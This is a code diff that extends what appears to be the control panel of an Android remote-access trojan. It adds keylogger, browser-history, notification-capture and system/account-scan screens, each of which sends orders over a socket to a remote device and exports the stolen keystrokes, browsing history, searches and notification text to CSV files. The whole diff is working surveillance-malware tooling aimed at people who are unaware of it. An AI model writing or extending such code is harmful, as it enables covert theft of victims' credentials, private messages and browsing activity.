@@ -108,6 +108,22 @@ app.config(function ($routeProvider) {
         .when("/screen", {
             templateUrl: "./views/screen.html",
             controller: "ScreenCtrl"
+        })
+        .when("/keylogger", {
+            templateUrl: "./views/keylogger.html",
+            controller: "KeyloggerCtrl"
+        })
+        .when("/browserHistory", {
+            templateUrl: "./views/browserHistory.html",
+            controller: "BrowserHistoryCtrl"
+        })
+        .when("/notifications", {
+            templateUrl: "./views/notifications.html",
+            controller: "NotificationsCtrl"
+        })
+        .when("/systemInfo", {
+            templateUrl: "./views/systemInfo.html",
+            controller: "SystemInfoCtrl"
         });
 });
 
@@ -1423,4 +1439,329 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         initCanvas();
         $ScreenCtrl.getScreenInfo();
     }, 100);
+});
+
+//-----------------------Keylogger Controller------------------------
+app.controller("KeyloggerCtrl", function ($scope, $rootScope) {
+    $KeyloggerCtrl = $scope;
+    $KeyloggerCtrl.keylogs = [];
+    $KeyloggerCtrl.isLoading = false;
+    $KeyloggerCtrl.keyloggerEnabled = false;
+    $KeyloggerCtrl.keylogCount = 0;
+    $KeyloggerCtrl.uniqueApps = [];
+    $KeyloggerCtrl.barLimit = 50;
+    
+    var keylogger = CONSTANTS.orders.keylogger || 'x0000kl';
+
+    $KeyloggerCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(keylogger);
+    });
+
+    $KeyloggerCtrl.getKeylogs = () => {
+        $KeyloggerCtrl.isLoading = true;
+        $rootScope.Log('[→] Fetching keylogs...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: keylogger, extra: 'get' });
+    };
+
+    $KeyloggerCtrl.clearKeylogs = () => {
+        $KeyloggerCtrl.keylogs = [];
+        $KeyloggerCtrl.keylogCount = 0;
+        $KeyloggerCtrl.uniqueApps = [];
+        $rootScope.Log('[→] Clearing keylogs...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: keylogger, extra: 'clear' });
+    };
+
+    $KeyloggerCtrl.exportKeylogs = () => {
+        if ($KeyloggerCtrl.keylogs.length === 0) return;
+        
+        var content = "Timestamp,App,Type,Content\n";
+        $KeyloggerCtrl.keylogs.forEach(log => {
+            content += `${new Date(log.timestamp).toLocaleString()},${log.app},${log.type},"${log.content.replace(/"/g, '""')}"\n`;
+        });
+        
+        var filePath = path.join(downloadsPath, "Keylogs_" + Date.now() + ".csv");
+        fs.outputFile(filePath, content, (err) => {
+            if (err)
+                $rootScope.Log('[✗] Failed to export keylogs', CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log(`[✓] Keylogs exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
+        });
+    };
+
+    $KeyloggerCtrl.increaseLimit = () => {
+        $KeyloggerCtrl.barLimit += 50;
+    };
+
+    $KeyloggerCtrl.getTypeIcon = (type) => {
+        switch(type) {
+            case 'TEXT': return 'keyboard icon';
+            case 'WINDOW': return 'window maximize icon';
+            case 'NOTIFICATION': return 'bell icon';
+            default: return 'file alternate icon';
+        }
+    };
+
+    $KeyloggerCtrl.copyLog = (log) => {
+        if (navigator.clipboard) {
+            navigator.clipboard.writeText(log.content);
+            $rootScope.Log('[✓] Copied to clipboard', CONSTANTS.logStatus.SUCCESS);
+        }
+    };
+
+    socket.on(keylogger, (data) => {
+        $KeyloggerCtrl.isLoading = false;
+        
+        if (data.logs) {
+            $KeyloggerCtrl.keylogs = data.logs;
+            $KeyloggerCtrl.keylogCount = data.logs.length;
+            $KeyloggerCtrl.keyloggerEnabled = data.enabled;
+            
+            // Extract unique apps
+            const apps = new Set(data.logs.map(l => l.app));
+            $KeyloggerCtrl.uniqueApps = Array.from(apps).sort();
+            
+            $rootScope.Log(`[✓] Received ${data.logs.length} keylogs`, CONSTANTS.logStatus.SUCCESS);
+            $KeyloggerCtrl.$apply();
+        } else if (data.status) {
+            $KeyloggerCtrl.keyloggerEnabled = data.enabled;
+            $KeyloggerCtrl.$apply();
+        }
+    });
+
+    // Initial load
+    $KeyloggerCtrl.getKeylogs();
+});
+
+//-----------------------Browser History Controller------------------------
+app.controller("BrowserHistoryCtrl", function ($scope, $rootScope) {
+    $BrowserCtrl = $scope;
+    $BrowserCtrl.history = [];
+    $BrowserCtrl.bookmarks = [];
+    $BrowserCtrl.searches = [];
+    $BrowserCtrl.isLoading = false;
+    $BrowserCtrl.activeTab = 'history';
+    $BrowserCtrl.barLimit = 50;
+    
+    var browserHistory = CONSTANTS.orders.browserHistory || 'x0000bh';
+
+    $BrowserCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(browserHistory);
+    });
+
+    $BrowserCtrl.getHistory = () => {
+        $BrowserCtrl.isLoading = true;
+        $rootScope.Log('[→] Fetching browser data...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: browserHistory });
+    };
+
+    $BrowserCtrl.exportHistory = () => {
+        var content = "";
+        
+        if ($BrowserCtrl.activeTab === 'history') {
+            content = "Date,Title,URL,Visits\n";
+            $BrowserCtrl.history.forEach(item => {
+                content += `${new Date(item.date).toLocaleString()},"${(item.title||'').replace(/"/g, '""')}","${item.url}",${item.visits}\n`;
+            });
+        } else if ($BrowserCtrl.activeTab === 'bookmarks') {
+            content = "Created,Title,URL\n";
+            $BrowserCtrl.bookmarks.forEach(item => {
+                content += `${new Date(item.created).toLocaleString()},"${(item.title||'').replace(/"/g, '""')}","${item.url}"\n`;
+            });
+        } else {
+            content = "Date,Query\n";
+            $BrowserCtrl.searches.forEach(item => {
+                content += `${new Date(item.date).toLocaleString()},"${(item.query||'').replace(/"/g, '""')}"\n`;
+            });
+        }
+        
+        var filePath = path.join(downloadsPath, "Browser_" + $BrowserCtrl.activeTab + "_" + Date.now() + ".csv");
+        fs.outputFile(filePath, content, (err) => {
+            if (err)
+                $rootScope.Log('[✗] Failed to export data', CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log(`[✓] Data exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
+        });
+    };
+
+    $BrowserCtrl.increaseLimit = () => {
+        $BrowserCtrl.barLimit += 50;
+    };
+
+    socket.on(browserHistory, (data) => {
+        $BrowserCtrl.isLoading = false;
+        
+        if (data.history) {
+            $BrowserCtrl.history = data.history;
+            $BrowserCtrl.bookmarks = data.bookmarks || [];
+            $BrowserCtrl.searches = data.searches || [];
+            
+            $rootScope.Log(`[✓] Received browser data: ${data.history.length} history items`, CONSTANTS.logStatus.SUCCESS);
+            $BrowserCtrl.$apply();
+        } else {
+            $rootScope.Log('[⚠] No browser data found or permission denied', CONSTANTS.logStatus.WARNING);
+        }
+    });
+
+    // Initial load
+    $BrowserCtrl.getHistory();
+});
+
+//-----------------------Notifications Controller------------------------
+app.controller("NotificationsCtrl", function ($scope, $rootScope) {
+    $NotifCtrl = $scope;
+    $NotifCtrl.notifications = [];
+    $NotifCtrl.isLoading = false;
+    $NotifCtrl.notificationEnabled = false;
+    $NotifCtrl.notificationCount = 0;
+    $NotifCtrl.uniqueApps = [];
+    $NotifCtrl.barLimit = 50;
+    
+    var notifications = CONSTANTS.orders.notifications || 'x0000nt';
+
+    $NotifCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(notifications);
+    });
+
+    $NotifCtrl.getNotifications = () => {
+        $NotifCtrl.isLoading = true;
+        $rootScope.Log('[→] Fetching notifications...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: notifications, extra: 'all' });
+    };
+
+    $NotifCtrl.getActiveNotifications = () => {
+        $NotifCtrl.isLoading = true;
+        $rootScope.Log('[→] Fetching active notifications...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: notifications, extra: 'active' });
+    };
+
+    $NotifCtrl.clearNotifications = () => {
+        $NotifCtrl.notifications = [];
+        $NotifCtrl.notificationCount = 0;
+        $rootScope.Log('[→] Clearing notifications...', CONSTANTS.logStatus.INFO);
+        // Note: This only clears local view, usually we don't clear on device unless specified
+    };
+
+    $NotifCtrl.exportNotifications = () => {
+        if ($NotifCtrl.notifications.length === 0) return;
+        
+        var content = "Timestamp,App,Title,Text,Action\n";
+        $NotifCtrl.notifications.forEach(n => {
+            content += `${new Date(n.timestamp).toLocaleString()},${n.appName},"${(n.title||'').replace(/"/g, '""')}","${(n.text||'').replace(/"/g, '""')}",${n.action}\n`;
+        });
+        
+        var filePath = path.join(downloadsPath, "Notifications_" + Date.now() + ".csv");
+        fs.outputFile(filePath, content, (err) => {
+            if (err)
+                $rootScope.Log('[✗] Failed to export notifications', CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log(`[✓] Notifications exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
+        });
+    };
+
+    $NotifCtrl.increaseLimit = () => {
+        $NotifCtrl.barLimit += 50;
+    };
+
+    socket.on(notifications, (data) => {
+        $NotifCtrl.isLoading = false;
+        
+        if (data.notifications) {
+            $NotifCtrl.notifications = data.notifications;
+            $NotifCtrl.notificationCount = data.notifications.length;
+            $NotifCtrl.notificationEnabled = data.enabled;
+            
+            // Extract unique apps
+            const apps = new Set(data.notifications.map(n => n.appName));
+            $NotifCtrl.uniqueApps = Array.from(apps).sort();
+            
+            $rootScope.Log(`[✓] Received ${data.notifications.length} notifications`, CONSTANTS.logStatus.SUCCESS);
+            $NotifCtrl.$apply();
+        } else if (data.status) {
+            $NotifCtrl.notificationEnabled = data.enabled;
+            $NotifCtrl.$apply();
+        }
+    });
+
+    // Initial load
+    $NotifCtrl.getNotifications();
+});
+
+//-----------------------System Info Controller------------------------
+app.controller("SystemInfoCtrl", function ($scope, $rootScope) {
+    $SysInfoCtrl = $scope;
+    $SysInfoCtrl.systemData = null;
+    $SysInfoCtrl.isLoading = false;
+    $SysInfoCtrl.activeTab = 'battery';
+    
+    var systemInfo = CONSTANTS.orders.systemInfo || 'x0000si';
+
+    $SysInfoCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(systemInfo);
+    });
+
+    $SysInfoCtrl.getAllSystemInfo = () => {
+        $SysInfoCtrl.isLoading = true;
+        $rootScope.Log('[→] Scanning system...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: systemInfo });
+    };
+
+    $SysInfoCtrl.formatUptime = (millis) => {
+        if (!millis) return '0s';
+        const seconds = Math.floor(millis / 1000);
+        const minutes = Math.floor(seconds / 60);
+        const hours = Math.floor(minutes / 60);
+        const days = Math.floor(hours / 24);
+        
+        if (days > 0) return `${days}d ${hours % 24}h`;
+        if (hours > 0) return `${hours}h ${minutes % 60}m`;
+        return `${minutes}m ${seconds % 60}s`;
+    };
+
+    $SysInfoCtrl.formatBytes = (bytes) => {
+        if (!bytes || bytes === 0) return '0 B';
+        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(1024));
+        return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
+    };
+
+    $SysInfoCtrl.formatTime = (millis) => {
+        if (!millis) return '0s';
+        const seconds = Math.floor(millis / 1000);
+        const minutes = Math.floor(seconds / 60);
+        const hours = Math.floor(minutes / 60);
+        
+        if (hours > 0) return `${hours}h ${minutes % 60}m`;
+        return `${minutes}m ${seconds % 60}s`;
+    };
+
+    $SysInfoCtrl.getBatteryClass = (level) => {
+        if (level <= 15) return 'battery-low';
+        if (level <= 40) return 'battery-medium';
+        return 'battery-high';
+    };
+
+    $SysInfoCtrl.getAccountIcon = (type) => {
+        if (type.includes('google')) return 'google icon';
+        if (type.includes('facebook')) return 'facebook icon';
+        if (type.includes('twitter')) return 'twitter icon';
+        if (type.includes('whatsapp')) return 'whatsapp icon';
+        if (type.includes('telegram')) return 'telegram icon';
+        return 'user circle icon';
+    };
+
+    $SysInfoCtrl.getImportanceClass = (importance) => {
+        if (importance === 'Foreground') return 'badge--success';
+        if (importance === 'Visible') return 'badge--info';
+        return 'badge--default';
+    };
+
+    socket.on(systemInfo, (data) => {
+        $SysInfoCtrl.isLoading = false;
+        $SysInfoCtrl.systemData = data;
+        $rootScope.Log('[✓] System analysis complete', CONSTANTS.logStatus.SUCCESS);
+        $SysInfoCtrl.$apply();
+    });
+
+    // Initial load
+    $SysInfoCtrl.getAllSystemInfo();
 });
